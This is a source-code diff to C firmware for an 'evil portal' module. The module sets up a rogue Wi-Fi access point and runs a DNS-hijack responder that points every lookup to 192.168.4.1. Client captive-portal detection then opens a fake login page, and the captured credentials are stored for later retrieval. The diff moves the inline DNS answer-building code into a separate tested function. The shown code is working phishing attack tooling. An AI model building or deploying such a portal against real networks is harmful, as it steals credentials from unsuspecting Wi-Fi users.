@@ -4,6 +4,7 @@
 // netif and switches to AP mode. A UDP:53 DNS-hijack responder resolves every lookup to the AP so client
 // captive-portal detection auto-opens the login page; captured credentials are retained for `evilportal creds`.
 #include "lxveos_evilportal.h"
+#include "lxveos_evilportal_dns.h"
 
 #include <ctype.h>
 #include <stddef.h>
@@ -200,43 +201,16 @@ static void dns_task(void *arg)
         struct sockaddr_in src;
         socklen_t sl = sizeof(src);
         int len = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&src, &sl);
-        if (len < 12) {
-            if (len < 0) {
-                break;  // socket shut down by stop()
-            }
-            continue;
+        if (len < 0) {
+            break;  // socket shut down by stop()
         }
-        buf[2] = 0x81;  // QR=1, opcode 0, RD copied
-        buf[3] = 0x80;  // RA=1, RCODE=0
-        buf[6] = 0x00;
-        buf[7] = 0x01;  // ANCOUNT = 1
-        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;  // NSCOUNT / ARCOUNT = 0
-        int qend = 12;
-        while (qend < len && buf[qend] != 0) {
-            qend += buf[qend] + 1;  // walk the QNAME labels
+        // Build the captive reply in place (pure, host-tested): every query -> the AP gateway 192.168.4.1.
+        static const uint8_t ap_ip[4] = {192, 168, 4, 1};
+        size_t rlen = lxveos_evilportal_dns_reply(buf, (size_t)len, sizeof(buf), ap_ip);
+        if (rlen == 0) {
+            continue;  // too short / malformed / no room for the answer
         }
-        qend += 5;  // null label (1) + QTYPE (2) + QCLASS (2)
-        if (qend > len || qend + 16 > (int)sizeof(buf)) {
-            continue;  // malformed or no room for the answer
-        }
-        int p = qend;
-        buf[p++] = 0xC0;
-        buf[p++] = 0x0C;  // NAME: pointer to the question
-        buf[p++] = 0x00;
-        buf[p++] = 0x01;  // TYPE A
-        buf[p++] = 0x00;
-        buf[p++] = 0x01;  // CLASS IN
-        buf[p++] = 0x00;
-        buf[p++] = 0x00;
-        buf[p++] = 0x00;
-        buf[p++] = 0x3c;  // TTL 60s
-        buf[p++] = 0x00;
-        buf[p++] = 0x04;  // RDLENGTH 4
-        buf[p++] = 192;
-        buf[p++] = 168;
-        buf[p++] = 4;
-        buf[p++] = 1;  // RDATA: 192.168.4.1 (the AP gateway)
-        sendto(sock, buf, p, 0, (struct sockaddr *)&src, sl);
+        sendto(sock, buf, rlen, 0, (struct sockaddr *)&src, sl);
     }
     close(sock);
     s_dns_sock = -1;
